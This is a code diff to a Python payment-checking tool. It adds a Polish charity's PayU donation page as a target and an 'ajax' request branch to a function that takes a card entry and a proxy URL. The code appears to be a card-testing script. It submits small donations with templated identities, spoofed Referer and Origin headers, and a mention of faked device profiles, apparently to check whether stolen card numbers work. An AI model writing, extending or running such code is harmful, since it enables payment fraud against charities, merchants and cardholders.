@@ -141,6 +141,29 @@ PAYU_SITES = {
             "donate": "WSPIERAM",
         },
     },
+    "magnaliadei": {
+        "create_url": "https://magnaliadei.pl/ajax/dotacja&rid=119",
+        "create_type": "ajax",
+        "referer": "https://magnaliadei.pl/przekaz-darowizne-przez-payu",
+        "origin": "https://magnaliadei.pl",
+        "amount": "10",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_form": {
+            "first_name": "{first}",
+            "last_name": "{last}",
+            "email": "{email}",
+            "amount": "10",
+            "customAmount": "10",
+            "newsletter": "on",
+            "terms_accept": "on",
+            "gdpr_consent": "on",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -290,7 +313,16 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
 
     try:
         # 1. create the order on the merchant (json API or html form + redirect)
-        if cfg["create_type"] == "utf":
+        if cfg["create_type"] == "ajax":
+            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
+            r = await s.post(
+                cfg["create_url"], data=form,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/x-www-form-urlencoded",
+                         "X-Requested-With": "XMLHttpRequest"})
+            data = r.json()
+            redirect = data.get("href") or ""
+        elif cfg["create_type"] == "utf":
             # two-step: donation form -> HTML with NewPayment form -> NewPayment -> redirect
             form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
             r = await s.post(
